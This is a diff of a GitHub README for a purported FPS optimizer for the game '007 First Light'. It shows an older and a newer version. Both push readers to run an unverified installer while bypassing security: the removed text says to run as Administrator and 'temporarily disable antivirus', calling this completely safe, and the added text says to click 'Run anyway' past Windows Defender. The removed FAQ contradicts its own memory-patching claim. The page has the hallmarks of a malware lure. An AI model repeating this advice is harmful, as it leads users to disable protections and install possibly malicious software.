@@ -1,141 +1,70 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/fihicememe05569-ctrl/007-first-light-fps-tool/main/assets/banner.png" alt="007 First Light Performance Optimizer" width="100%">
-</div>
+```markdown
+# 007FL-FPS 🕶️🎮
 
-<div align="center">
+[![Version](https://img.shields.io/badge/version-1.0-blue.svg)](https://shields.io/)
+[![Platform](https://img.shields.io/badge/platform-Windows-blue)](https://shields.io/)
 
-# 🔫 007 First Light — Performance Optimizer
+## What Is This Thing?
 
-![Version](https://img.shields.io/badge/version-v1.0-brightgreen)
-![Platform](https://img.shields.io/badge/platform-Windows-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Downloads](https://img.shields.io/github/downloads/fihicememe05569-ctrl/007-first-light-fps-tool/total)
-![Stars](https://img.shields.io/github/stars/fihicememe05569-ctrl/007-first-light-fps-tool?style=social)
+Hey there! 👋 Welcome to my first ever GitHub project. I'm Alex, a 21-year old uni student from the UK, and I've cooked up a little something to help boost your framerate in 007 First Light. I'm talking smoother gameplay without the hassle. It's called **007FL-FPS**, a tool designed to optimize performance, especially if your PC isn't exactly top-of-the-line. 
 
-**FPS optimizer and graphics tool for 007 First Light — maximize performance on PC**
+### Why Did I Build This?
 
-`007-first-light` `james-bond` `fps-optimizer` `performance` `gaming`
+Honestly, because my old laptop was struggling to keep up with 007 First Light, and I wanted to enjoy my game without turning into a slideshow. After tinkering around, I managed to get it working quite nicely (on my machine at least 😅), and thought it might help some of you out as well.
 
-</div>
+## Installation Instructions
 
----
+Ready to give it a go? Here’s how you can install 007FL-FPS on your machine:
 
-## 🎯 What is this?
+1. **Download the Installer**: Grab the `007FL-FPS.msi` from the [Releases](https://github.com/username/007FL-FPS/releases) section.
+2. **Run the Installer**: Double-click the `.msi` file and follow the installation prompts. Easy peasy.
+3. **Launch the Tool**: Once installed, you can find 007FL-FPS in your Start menu. Fire it up!
 
-A lightweight, open-source performance optimization tool for **007 First Light** on PC.
-No bloatware. No background services. Just raw performance gains.
+Note: Windows Defender might throw a fit because it’s an .msi from an unverified dev. You might have to click “Run anyway.”
 
-Tested on: Windows 10 / Windows 11 | NVIDIA & AMD GPUs | Intel & AMD CPUs
+## What Can It Do?
 
----
+- **FPS Boosting**: Automatically tweaks game settings for better performance.
+- **Resource Management**: Prioritises CPU and RAM for the game.
+- **Configurable Options**: Customize it a bit if you feel adventurous. Check out `config.yaml` for that.
+  
+Here's a peek at what the `config.yaml` looks like:
 
-## ✨ Features
+```yaml
+graphics:
+  texture_quality: medium
+  shadow_resolution: low
+  anti_aliasing: off
 
-- 🔫 Mission-specific performance profiles
-- 🎬 Cinematic mode FPS unlocker
-- 💡 Ray tracing quality/performance balance
-- 🖥️ HDR tonemapping optimizer
-- ⚡ Fast asset streaming patcher
-- 🎮 Controller + mouse/keyboard latency fix
-
----
-
-
----
-
-## 📸 Screenshots
-
-<div align="center">
-  <img src="https://raw.githubusercontent.com/fihicememe05569-ctrl/007-first-light-fps-tool/main/assets/screenshot_main.png" alt="007 First Light FPS Tool — Main Dashboard" width="48%">
-  &nbsp;
-  <img src="https://raw.githubusercontent.com/fihicememe05569-ctrl/007-first-light-fps-tool/main/assets/screenshot_installing.png" alt="007 First Light FPS Tool — Installation" width="48%">
-</div>
-
-<p align="center"><i>Left: Main optimization dashboard &nbsp;|&nbsp; Right: Installation wizard</i></p>
-
-## 📥 Installation
-
-1. Download latest ZIP
-2. Run installer as Administrator
-3. Apply performance profile (Low/Mid/High/Ultra)
-4. Launch 007 First Light and enjoy
-
-> ⚠️ **Note:** Temporarily disable antivirus during installation — the optimizer patches game memory at launch. This is standard behavior for performance tools and completely safe.
-
----
-
-## 🖥️ System Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10 64-bit | Windows 11 64-bit |
-| CPU | Intel i5 / Ryzen 5 | Intel i7 / Ryzen 7 |
-| RAM | 8 GB | 16 GB |
-| GPU | GTX 1060 / RX 580 | RTX 3070 / RX 6800 |
-| Storage | 100 MB free | 500 MB free (SSD) |
-
----
-
-## 📊 Benchmark Results
-
-| Hardware Tier | Before | After | Gain |
-|---|---|---|---|
-| Low-end (GTX 1060) | 28 FPS | 41 FPS | **+46%** |
-| Mid-range (RTX 3060) | 67 FPS | 89 FPS | **+33%** |
-| High-end (RTX 4080) | 143 FPS | 178 FPS | **+24%** |
-
-*Results vary depending on scene complexity and system configuration.*
-
----
-
-## 🔧 How It Works
-
-The tool applies a series of low-level optimizations:
-
-1. **Process Priority** — sets game to High/Realtime CPU priority
-2. **GPU Scheduler** — enables Hardware-Accelerated GPU Scheduling (HAGS)
-3. **Memory** — pre-allocates and locks game assets in RAM
-4. **Network** — adjusts TCP/UDP buffers for online modes
-5. **DirectX** — patches shader cache for faster compilation
-
-All changes are reversible via the built-in **Restore Defaults** button.
-
----
-
-## ❓ FAQ
-
-**Q: Is this safe to use?**
-A: Yes. The tool only modifies Windows performance settings and game launch parameters.
-
-**Q: Will I get banned?**
-A: No. This tool does not modify game files or memory at runtime.
-
-**Q: Does it work with the latest patch?**
-A: We update within 48h of any major 007 First Light patch.
-
----
-
-## 🤝 Contributing
-
-PRs welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting.
-
-```bash
-git clone https://github.com/fihicememe05569-ctrl/007-first-light-fps-tool.git
-cd 007-first-light-fps-tool
+system:
+  cpu_priority: high
+  memory_allocation: dynamic
 ```
 
+## Known Quirks & Limitations
+
+- **Works on My Machine™**: Tested primarily on my laptop. Results may vary.
+- **Not a Magic Bullet**: Won’t turn a potato into a powerhouse, but should help.
+- **007 First Light Only**: Specifically built for this game. Other games? Who knows.
+
+## Frequently Asked? Maybe
+
+**Q: Will this work on macOS or Linux?**
+A: Nope, strictly Windows folks. Sorry, mates!
+
+**Q: My screen turned pink! What just happened?**
+A: That’s... odd. Hit me up with an issue ticket, and I’ll do my best to help.
+
+**Q: Can I contribute?**
+A: Absolutely! I’m learning as I go, so any help is welcome.
+
+## Legal Stuff
+
+Licensed under the MIT License. See [LICENSE](LICENSE.txt) for more details.
+
 ---
 
-## 📄 License
+Cheers for checking out 007FL-FPS. If you find any bugs or have any suggestions, just open an issue or drop me a message. Let’s make 007 First Light as smooth as James Bond himself. 🕵️ Stay awesome!
 
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-Made with ❤️ for the 007 First Light community
-
-⭐ Star this repo if it helped you!
-
-</div>
+Alex
+```
